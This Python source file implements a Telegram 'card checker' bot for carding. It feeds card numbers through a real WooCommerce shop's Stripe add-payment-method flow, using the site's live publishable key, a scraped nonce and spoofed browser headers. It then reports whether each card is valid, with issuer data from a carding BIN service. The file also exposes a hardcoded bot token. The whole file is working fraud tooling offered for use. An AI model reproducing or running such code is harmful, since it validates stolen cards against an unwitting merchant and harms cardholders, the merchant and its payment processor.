import aiohttp
import asyncio
from datetime import datetime
from aiogram import Bot, Dispatcher, types

# ==== CONFIG ====
TOKEN = "8003502803:AAHz0pg5zbhjZaeNsdR3FudgT2Yx1PMuF0s"
DOMAIN = "https://infiniteautowerks.com/"
PK = "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae"
CHECKER_NAME = "Bᴜɴɴʏ"

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# ==== CLASSIC UI ====
def format_result(card, status, response, gate, bin_, country, issuer, typ, time, by):
    return (
        f"[ϟ] 𝗖𝗖 - <code>{card}</code>\n"
        f"[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status}\n"
        f"[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {response}\n"
        f"[ϟ] 𝗚𝗮𝘁𝗲 - {gate}\n"
        "━━━━━━━━━━━━━\n"
        f"[ϟ] 𝗕𝗶𝗻 : {bin_}\n"
        f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country}\n"
        f"[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿 : {issuer}\n"
        f"[ϟ] 𝗧𝘆𝗽𝗲 : {typ}\n"
        "━━━━━━━━━━━━━\n"
        f"[ϟ] 𝗧𝗶𝗺𝗲 : {time}\n"
        f"[ϟ] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 : <b>{by}</b>"
    )

# ==== BIN LOOKUP ====
async def get_bin_info(bin_):
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_}"
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    line = text.strip().split('\n')[0]
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) >= 6:
                        scheme = parts[1]
                        typ = parts[2]
                        country = parts[4]
                        issuer = parts[3]
                        card_type = f"{typ.upper()} - {scheme.upper()}"
                        return country, issuer, card_type
    except Exception as e:
        print("BIN lookup error:", e)
    return "UNKNOWN", "UNKNOWN", "UNKNOWN"

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

# ==== SITE RESPONSE PARSER ====
def parse_site_response(site_text):
    lower = site_text.lower()
    if "succeeded" in lower or "setup_intent" in lower or "approved" in lower or "payment method added" in lower or "success" in lower:
        return "APPROVED", "Payment method successfully added ✅"
    elif "insufficient funds" in lower:
        return "APPROVED", "Payment method successfully added ✅ (Insufficient funds)"
    elif "3d secure" in lower or "authentication required" in lower or "three_d_secure" in lower:
        return "DECLINED", "3D Secure authentication required 🔒"
    elif "incorrect_cvc" in lower or "cvc was incorrect" in lower or "security code is incorrect" in lower:
        return "DECLINED", "Incorrect CVC"
    elif "card was declined" in lower or "card_declined" in lower or ("declined" in lower and "insufficient" not in lower):
        return "DECLINED", "Card was declined"
    elif "expired_card" in lower:
        return "DECLINED", "Expired card"
    elif "pickup_card" in lower:
        return "DECLINED", "Pick up card (stolen/lost)"
    elif "processing_error" in lower:
        return "DECLINED", "Processing error"
    elif "do_not_honor" in lower:
        return "DECLINED", "Do not honor"
    elif "incorrect_number" in lower or "invalid number" in lower:
        return "DECLINED", "Incorrect card number"
    elif "balance not sufficient" in lower or "insufficient balance" in lower:
        return "DECLINED", "Insufficient balance"
    elif "invalid_account" in lower:
        return "DECLINED", "Invalid account"
    else:
        preview = site_text.strip()[:100].replace('\n', ' ')
        return "DECLINED", preview if preview else "Unknown site response"

async def make_request(session, url, method="POST", params=None, headers=None, data=None, json=None):
    async with session.request(
        method,
        url,
        params=params,
        headers=headers,
        data=data,
        json=json,
    ) as response:
        return await response.text()

# ==== LIVE CHECKER ====
async def ppc(cards):
    cc, mon, year, cvv = cards.split("|")
    year = year[-2:]

    async with aiohttp.ClientSession() as my_session:
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "max-age=0",
            "priority": "u=0, i",
            "referer": f"{DOMAIN}/my-account/payment-methods/",
            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        }
        req = await make_request(
            my_session,
            url=f"{DOMAIN}/my-account/add-payment-method/",
            method="GET",
            headers=headers,
        )
        await asyncio.sleep(1)
        nonce = parseX(req, '"createAndConfirmSetupIntentNonce":"', '"')

        headers2 = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "priority": "u=1, i",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        }
        data2 = {
            "type": "card",
            "card[number]": f"{cc}",
            "card[cvc]": f"{cvv}",
            "card[exp_year]": f"{year}",
            "card[exp_month]": f"{mon}",
            "allow_redisplay": "unspecified",
            "billing_details[address][postal_code]": "99501",
            "billing_details[address][country]": "US",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
            "referrer": DOMAIN,
            "time_on_page": "187650",
            "client_attribution_metadata[client_session_id]": "8c6ceb69-1a1d-4df7-aece-00f48946fa47",
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "guid": "19ae2e71-398b-4dff-929f-1578fe0c0a1a4731fd",
            "muid": "2b6bbdfd-253b-4197-b81b-4d9f3035cd009df6c5",
            "sid": "ad7b0952-8857-4cfd-b07f-3f43034df86cea6048",
            "key": PK,
            "_stripe_version": "2024-06-20",
        }
        req2 = await make_request(
            my_session,
            f"https://api.stripe.com/v1/payment_methods",
            headers=headers2,
            data=data2,
        )
        await asyncio.sleep(1)
        pmid = parseX(req2, '"id": "', '"')

        headers3 = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": DOMAIN,
            "priority": "u=1, i",
            "referer": f"{DOMAIN}/my-account/add-payment-method/",
            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }
        data3 = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pmid,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": nonce,
        }
        req4 = await make_request(
            my_session,
            url=f"{DOMAIN}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
            headers=headers3,
            data=data3,
        )
        status, response = parse_site_response(req4)
        return status, response

# ==== BOT COMMANDS ====

@dp.message_handler(commands=["start", "help"])
async def start_help(message: types.Message):
    await message.reply(
        "<b>Card Checker Bot</b>\n\n"
        "Commands:\n"
        "• /chk <code>CC|MM|YY|CVV</code> — Single check\n",
        parse_mode="HTML"
    )

@dp.message_handler(commands=["chk"])
async def chk_handler(message: types.Message):
    args = message.get_args().strip()
    if not args:
        await message.reply("Usage: `/chk 4242424242424242|12|25|123`", parse_mode="Markdown")
        return
    card = args
    checking_msg = await message.reply(f"🔄 Checking: <code>{card}</code>", parse_mode="HTML")
    try:
        status_raw, response = await ppc(card)
        status = "APPROVED ✅" if "APPROVED" in status_raw else "DECLINED ❌"
        bin_ = card[:6]
        country, issuer, typ = await get_bin_info(bin_)
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_name = message.from_user.first_name if message.from_user else CHECKER_NAME
        text = format_result(card, status, response, "Stripe Auth", bin_, country, issuer, typ, now, user_name)
        await checking_msg.edit_text(text, parse_mode="HTML")
    except Exception as e:
        await checking_msg.edit_text(f"Error: <code>{e}</code>", parse_mode="HTML")

if __name__ == "__main__":
    from aiogram import executor
    executor.start_polling(dp, skip_updates=True)
